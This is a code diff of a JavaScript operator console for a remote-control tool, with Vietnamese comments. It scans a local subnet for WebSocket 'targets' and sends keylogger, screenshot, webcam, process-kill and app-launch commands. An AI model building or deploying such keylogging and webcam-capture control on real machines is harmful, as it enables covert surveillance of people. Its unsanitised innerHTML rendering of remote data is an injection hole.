@@ -1,32 +1,51 @@
-// KHAI BÁO BIẾN TOÀN CỤC
 let ws = null;
-let flag = -1; 
-let foundServers = []; // Mảng chứa các server tìm thấy
+let flag = -1;
+let foundServers = [];
+let currentConnMode = 'manual'; // Mặc định là manual
 
-// --- PHẦN 1: QUẢN LÝ QUÉT MẠNG (SCANNER) ---
+// --- HÀM CHUYỂN ĐỔI TAB (MỚI) ---
+function switchConnMode(mode) {
+    currentConnMode = mode;
 
+    // 1. Xử lý giao diện nút Tab
+    document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+    
+    if (mode === 'scan') {
+        document.getElementById('tabScan').classList.add('active');
+        document.getElementById('modeScan').style.display = 'block';
+        document.getElementById('modeManual').style.display = 'none';
+    } else {
+        document.getElementById('tabManual').classList.add('active');
+        document.getElementById('modeScan').style.display = 'none';
+        document.getElementById('modeManual').style.display = 'block';
+    }
+}
+
+// --- UTILS UI ---
+function updateStatus(status, color) {
+    const el = document.getElementById("connectionStatus");
+    el.innerHTML = `<span class="dot" style="color: ${color}"></span> ${status}`;
+    el.style.color = color;
+}
+
+// --- SCANNER ---
 function scanNetwork() {
-    const subnet = document.getElementById("subnetInput").value.trim(); // Ví dụ: 192.168.2.
+    const subnet = document.getElementById("subnetInput").value.trim();
     const port = document.getElementById("serverPort").value;
     const scanStatus = document.getElementById("scanStatus");
     const serverSelect = document.getElementById("serverList");
 
     if (!subnet.endsWith(".")) {
-        alert("Subnet phải kết thúc bằng dấu chấm (VD: 192.168.2.)");
+        alert("Subnet phải kết thúc bằng dấu chấm (VD: 192.168.1.)");
         return;
     }
 
-    // Reset danh sách
     foundServers = [];
     serverSelect.innerHTML = '<option disabled selected>Scanning...</option>';
     scanStatus.style.display = "block";
-    
-    // Quét từ .1 đến .254
+    scanStatus.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Scanning network range...';
+
     let pendingChecks = 0;
-    const totalChecks = 50; // Quét 50 IP đầu tiên cho nhanh (tăng lên 254 nếu cần quét hết)
-    
-    // Lưu ý: Quét quá nhiều IP cùng lúc có thể bị trình duyệt chặn. 
-    // Ở đây demo quét từ 1 -> 50. Bạn có thể sửa vòng lặp i <= 254
     for (let i = 1; i <= 254; i++) {
         let ip = subnet + i;
         pendingChecks++;
@@ -40,78 +59,63 @@ function scanNetwork() {
     }
 }
 
-// Hàm kiểm tra 1 IP cụ thể
-// Sửa lại hàm này trong backend.js
 function checkServer(ip, port, doneCallback) {
     let string = "ws://" + ip + ":" + port;
     let testWS = new WebSocket(string);
     let isConnected = false;
 
     testWS.onopen = () => {
-        console.log("FOUND SERVER AT: " + ip); // Log để dễ debug
+        console.log("FOUND: " + ip);
         isConnected = true;
-        foundServers.push(ip); // Lưu IP tìm thấy
+        foundServers.push(ip);
         testWS.close();
     };
-
-    testWS.onerror = () => { /* Lỗi = Không có server hoặc bị chặn */ };
-
+    testWS.onerror = () => { };
     testWS.onclose = () => {
-        // Chỉ gọi callback 1 lần
-        if (doneCallback) {
-            doneCallback();
-            doneCallback = null; // Đảm bảo không gọi lại
-        }
+        if (doneCallback) { doneCallback(); doneCallback = null; }
     };
-
-    // TĂNG THỜI GIAN CHỜ LÊN 1000ms (1 giây)
     setTimeout(() => {
-        if (!isConnected && testWS.readyState !== WebSocket.OPEN) {
-            testWS.close(); // Đóng sẽ kích hoạt onclose -> gọi callback
-        }
+        if (!isConnected && testWS.readyState !== WebSocket.OPEN) { testWS.close(); }
     }, 5000); 
 }
 
 function updateDropdown() {
     const select = document.getElementById("serverList");
     select.innerHTML = "";
-
     if (foundServers.length === 0) {
         let option = document.createElement("option");
-        option.text = "-- No Server Found --";
-        option.disabled = true;
-        option.selected = true;
-        select.add(option);
+        option.text = "-- No Targets Found --"; option.disabled = true; option.selected = true; select.add(option);
     } else {
         foundServers.forEach(ip => {
             let option = document.createElement("option");
-            option.value = ip;
-            option.text = ip;
-            select.add(option);
+            option.value = ip; option.text = ip; select.add(option);
         });
-        // Tự động chọn cái đầu tiên
         select.selectedIndex = 0;
     }
 }
 
-// --- PHẦN 2: QUẢN LÝ KẾT NỐI (CONNECT) ---
-
+// --- CONNECTION ---
 function connectToSelected() {
     const btn = document.getElementById("btnConnect");
-    const select = document.getElementById("serverList");
     const port = document.getElementById("serverPort").value;
+    let ip = "";
 
     // Nếu đang kết nối thì ngắt kết nối
     if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) {
-        ws.close();
-        return; 
+        ws.close(); 
+        return;
     }
 
-    // Lấy IP từ Dropdown
-    const ip = select.value;
-    if (!ip) {
-        alert("Vui lòng Scan và chọn 1 Server từ danh sách!");
-        return;
+    // --- LOGIC LẤY IP DỰA TRÊN CHẾ ĐỘ ---
+    if (currentConnMode === 'scan') {
+        // Lấy từ Dropdown
+        const select = document.getElementById("serverList");
+        ip = select.value;
+        if (!ip) { alert("Please select a target from the list!"); return; }
+    } else {
+        // Lấy từ ô nhập tay
+        ip = document.getElementById("manualIpInput").value.trim();
+        if (!ip) { alert("Please enter a valid IP address!"); return; }
     }
 
     connectToServer(ip, port);
@@ -119,77 +123,51 @@ function connectToSelected() {
 
 function connectToServer(ip, port) {
     const url = `ws://${ip}:${port}`;
-    console.log("Connecting to: " + url);
-    document.getElementById("connectionStatus").innerHTML = "🟡 Connecting to " + ip + "...";
-    document.getElementById("connectionStatus").style.color = "#ffc107";
+    updateStatus("Connecting...", "#f1c40f"); // Yellow
 
     try {
         ws = new WebSocket(url);
         ws.binaryType = "arraybuffer";
-        
         ws.onopen = onWSOpen;
         ws.onclose = onWSClose;
         ws.onmessage = onWSMessage;
         ws.onerror = onWSError;
-
-    } catch (e) {
-        console.error("Connection Error:", e);
-        alert("Lỗi kết nối!");
-    }
+    } catch (e) { console.error(e); alert("Connection Failed!"); }
 }
 
-// --- PHẦN 3: CÁC EVENT HANDLER (GIỮ NGUYÊN CODE CŨ) ---
-
 function onWSOpen() {
-    document.getElementById("connectionStatus").innerHTML = "🟢 Connected";
-    document.getElementById("connectionStatus").style.color = "#28a745";
-    
+    updateStatus("ONLINE", "#00fff5"); // Cyan/Green
     const btn = document.getElementById("btnConnect");
-    btn.innerText = "Disconnect";
+    btn.innerHTML = '<i class="fa-solid fa-unlink"></i> DISCONNECT';
     btn.classList.add("connected");
-    
-    // Disable inputs
     document.getElementById("serverList").disabled = true;
     document.getElementById("subnetInput").disabled = true;
-    
-    console.log("Connected to Server");
+
+    const dot = document.getElementsByClassName('dot')[0];
+    dot.style.backgroundColor = "#00ff37ff";
 }
 
 function onWSClose() {
-    document.getElementById("connectionStatus").innerHTML = "🔴 Disconnected";
-    document.getElementById("connectionStatus").style.color = "#dc3545";
-    
+    updateStatus("OFFLINE", "#ff2e63"); 
     const btn = document.getElementById("btnConnect");
-    btn.innerText = "Connect";
+    btn.innerHTML = '<i class="fa-solid fa-link"></i> CONNECT';
     btn.classList.remove("connected");
-
-    // Enable inputs
     document.getElementById("serverList").disabled = false;
     document.getElementById("subnetInput").disabled = false;
-    
-    console.log("Disconnected from Server");
     ws = null;
 }
 
-function onWSError(err) {
-    console.error("WebSocket Error:", err);
-    // onclose sẽ được gọi sau
-}
+function onWSError(err) { console.error("WS Error:", err); }
 
+// --- MESSAGE HANDLER ---
 function onWSMessage(event) {
-    // --- (GIỮ NGUYÊN CODE XỬ LÝ MESSAGE CŨ CỦA BẠN Ở DƯỚI) ---
-    // 1. XỬ LÝ DỮ LIỆU NHỊ PHÂN
     if (event.data instanceof ArrayBuffer) {
-        if (flag == 1) { // SCREENSHOT
+        if (flag == 1) { // Screenshot
             const blob = new Blob([event.data], { type: "image/bmp" });
             const url = URL.createObjectURL(blob);
-            const container = document.getElementById("screenshotContainer");
-            container.innerHTML = ""; 
-            const img = document.createElement("img");
-            img.src = url;
-            container.appendChild(img);
-        } 
-        else if (flag == 2) { // WEBCAM
+            document.getElementById("screenshotContainer").innerHTML = `<img src="${url}">`;
+        }
+        else if (flag == 2) { // Webcam
             const blob = new Blob([event.data], { type: 'video/mp4' });
             const videoUrl = URL.createObjectURL(blob);
             const videoPlayer = document.getElementById('videoPlayer');
@@ -197,30 +175,33 @@ function onWSMessage(event) {
             videoPlayer.src = videoUrl;
             videoPlayer.play().catch(e => console.error(e));
         }
-        flag = -1; 
-    } 
-    // 2. XỬ LÝ DỮ LIỆU VĂN BẢN
-    else {
+        flag = -1;
+    } else {
         HandleClientMSG(event.data);
     }
 }
 
-// ... (Copy tiếp phần HandleClientMSG và các hàm sendCommand từ code cũ vào đây) ...
 function HandleClientMSG(data) {
     if (data == "screenshot") { flag = 1; return; }
     if (data == "webcam") { flag = 2; return; }
-    if (data == "Keylogging started") { flag = 3; logKeyToConsole(">>> Keylogger Started"); return; }
-    if (data == "Keylogging stopped") { flag = 4; logKeyToConsole(">>> Keylogger Stopped"); return; }
+    if (data == "Keylogging started") { flag = 3; logKeyToConsole(">>> [SYSTEM] Keylogger Started"); return; }
+    if (data == "Keylogging stopped") { flag = 4; logKeyToConsole(">>> [SYSTEM] Keylogger Stopped"); return; }
 
-    if (data.includes(".exe") || data.includes("\n")) {
-        renderAppListToTable(data);
-    } else {
-        logKeyToConsole(data);
-    }
-    if (flag != 3) flag = -1; 
+    if (flag === 5) renderProcessListToTable(data);
+    else if (flag == 6) renderAppListToTable(data);
+    else logKeyToConsole(data);
+
+    if (flag != 3) flag = -1;
 }
 
-// HÀM HELPER UI
+function sendCommand(cmd) {
+    if (ws && ws.readyState === WebSocket.OPEN) {
+        ws.send(cmd);
+    } else {
+        alert("Not Connected!");
+    }
+}
+
 function switchTab(tabId) {
     document.querySelectorAll('.content-section').forEach(el => el.classList.remove('active'));
     document.querySelectorAll('.nav-links li').forEach(el => el.classList.remove('active'));
@@ -228,51 +209,135 @@ function switchTab(tabId) {
     event.currentTarget.classList.add('active');
 }
 
-function sendCommand(cmd) {
-    if (ws && ws.readyState === WebSocket.OPEN) {
-        ws.send(cmd);
-        console.log("Sent:", cmd);
-    } else {
-        alert("Chưa kết nối!");
-    }
-}
+// --- APP & PROCESS ---
+function listApp() { flag = 6; sendCommand("list_apps"); }
 
-// --- CÁC HÀM CŨ (listApp, renderAppListToTable, logKeyToConsole...) GIỮ NGUYÊN ---
-function listApp() { sendCommand("list_apps"); }
 function renderAppListToTable(dataString) {
     const tbody = document.getElementById("appListBody");
-    tbody.innerHTML = ""; 
-    const apps = dataString.split('\n'); 
-    apps.forEach(app => {
-        if (app.trim().length > 0) {
+    tbody.innerHTML = "";
+    const apps = dataString.split('\n');
+
+    apps.forEach(line => {
+        if (line.trim().length > 0) {
             const tr = document.createElement("tr");
+            const parts = line.split('|');
+            const name = parts[0].trim();
+            const path = parts.length > 1 ? parts[1].trim() : "";
+
+            // 1. Cột Tên App
             const tdName = document.createElement("td");
-            tdName.textContent = app;
+            tdName.innerHTML = `<strong style="color: #fff; font-size: 13px;">${name}</strong><br><span style="font-size: 11px; color: #666; font-family: 'JetBrains Mono', monospace;">${path || 'Unknown Path'}</span>`;
+
+            // 2. Cột Control (Action)
             const tdAction = document.createElement("td");
             
-            const btnStart = document.createElement("button");
-            btnStart.className = "btn btn-success"; btnStart.style.marginRight = "5px"; btnStart.innerText = "Start";
-            btnStart.onclick = () => sendCommand("start_app:" + app.trim());
+            // --- SỬA LỖI TẠI ĐÂY: TẠO DIV BAO BỌC ---
+            const divGroup = document.createElement("div");
+            divGroup.className = "btn-group-horizontal"; // Class CSS mới thêm
 
-            const btnStop = document.createElement("button");
-            btnStop.className = "btn btn-danger"; btnStop.innerText = "End";
-            btnStop.onclick = () => sendCommand("stop_app:" + app.trim());
+            // Logic xác định target
+            const startTarget = (path && path !== "Not Found") ? path : name;
+            let stopTarget = name;
+            if (path && path.includes("\\")) stopTarget = path.split('\\').pop();
+            else if (!stopTarget.toLowerCase().endsWith(".exe")) stopTarget += ".exe";
 
-            tdAction.appendChild(btnStart); tdAction.appendChild(btnStop);
-            tr.appendChild(tdName); tr.appendChild(tdAction); tbody.appendChild(tr);
+            // Tạo nút
+            const btnStart = createBtn('Start', "btn-neon-green", () => sendCommand("start_app:" + startTarget));
+            const btnStop = createBtn('Kill', "btn-neon-red", () => sendCommand("stop_app:" + stopTarget));
+            
+            // Thêm nút vào DIV Group trước
+            divGroup.appendChild(btnStart);
+            divGroup.appendChild(btnStop);
+
+            // Thêm DIV Group vào ô bảng
+            tdAction.appendChild(divGroup);
+
+            tr.appendChild(tdName);
+            tr.appendChild(tdAction);
+            tbody.appendChild(tr);
         }
     });
 }
-function manualStart() { const name = document.getElementById("manualAppName").value; if(name) sendCommand("start_app:" + name); }
-function manualStop() { const name = document.getElementById("manualAppName").value; if(name) sendCommand("stop_app:" + name); }
+
+function manualStart() { const name = document.getElementById("manualAppName").value; if (name) sendCommand("start_app:" + name); }
+function manualStop() { const name = document.getElementById("manualAppName").value; if (name) sendCommand("stop_app:" + name); }
+
+function listProcess() {
+    if (ws && ws.readyState === WebSocket.OPEN) {
+        flag = 5;
+        document.getElementById("processListBody").innerHTML = '<tr><td colspan="4" style="text-align:center; color:#ff9f43;">Fetching process list...</td></tr>';
+        ws.send("list_processes");
+    } else alert("Not Connected!");
+}
+
+function renderProcessListToTable(dataString) {
+    const tbody = document.getElementById("processListBody");
+    tbody.innerHTML = "";
+    const regex = /PID:\s*(\d+),\s*Name:\s*(.*?),\s*Threads:\s*(\d+)/g;
+    let match;
+    let count = 0;
+
+    while ((match = regex.exec(dataString)) !== null) {
+        count++;
+        const pid = match[1]; const name = match[2]; const threads = match[3];
+        const tr = document.createElement("tr");
+
+        tr.innerHTML = `
+            <td style="font-family: monospace; color: var(--primary)">${pid}</td>
+            <td><strong>${name}</strong></td>
+            <td style="color: #aaa">${threads}</td>
+        `;
+
+        const tdAction = document.createElement("td");
+        
+        // --- CŨNG BỌC DIV CHO PROCESS ---
+        const divGroup = document.createElement("div");
+        divGroup.className = "btn-group-horizontal";
+
+        const btnKill = createBtn('Kill', "btn-neon-red", () => {
+            if (confirm(`Kill ${name} (PID: ${pid})?`)) sendCommand("stop_process:" + pid);
+        });
+        
+        divGroup.appendChild(btnKill);
+        tdAction.appendChild(divGroup);
+        tr.appendChild(tdAction);
+        
+        tbody.appendChild(tr);
+    }
+    if (count === 0) tbody.innerHTML = '<tr><td colspan="4" class="empty-state">No Data Found</td></tr>';
+}
+
+function manualStopProc() { const pid = document.getElementById("manualProcID").value; if (pid) sendCommand("stop_process:" + pid); }
+
+function createBtn(text, className, onClick) {
+    const btn = document.createElement("button");
+    btn.className = "btn " + className;
+    btn.innerText = text;
+    btn.style.marginRight = "5px";
+    btn.style.padding = "4px 10px"; // Smaller in table
+    btn.style.fontSize = "11px";
+    btn.onclick = onClick;
+    return btn;
+}
+
+// --- MEDIA & LOG ---
 function startkeyLog() { sendCommand("start_keylog"); }
 function stopkeyLog() { sendCommand("stop_keylog"); }
 function screenShot() { sendCommand("screenshot"); }
 function webCam() { sendCommand("webcam"); }
+
 function logKeyToConsole(msg) {
     const consoleBox = document.getElementById("keylogConsole");
-    const span = document.createElement("span");
-    span.className = "console-line"; span.innerText = msg;
-    consoleBox.appendChild(span); consoleBox.scrollTop = consoleBox.scrollHeight;
+    const div = document.createElement("div");
+    div.className = "console-line";
+    
+    // Thêm timestamp cho pro
+    const time = new Date().toLocaleTimeString('en-US', {hour12: false});
+    div.innerHTML = `<span style="color: #555">[${time}]</span> ${msg}`;
+    
+    consoleBox.appendChild(div);
+    consoleBox.scrollTop = consoleBox.scrollHeight;
 }
-function clearConsole() { document.getElementById("keylogConsole").innerHTML = '<span class="console-line">Console cleared.</span>'; }
+function clearConsole() { 
+    document.getElementById("keylogConsole").innerHTML = '<div class="console-line system-msg">>> Console cleared.<span class="cursor">_</span></div>'; 
+}
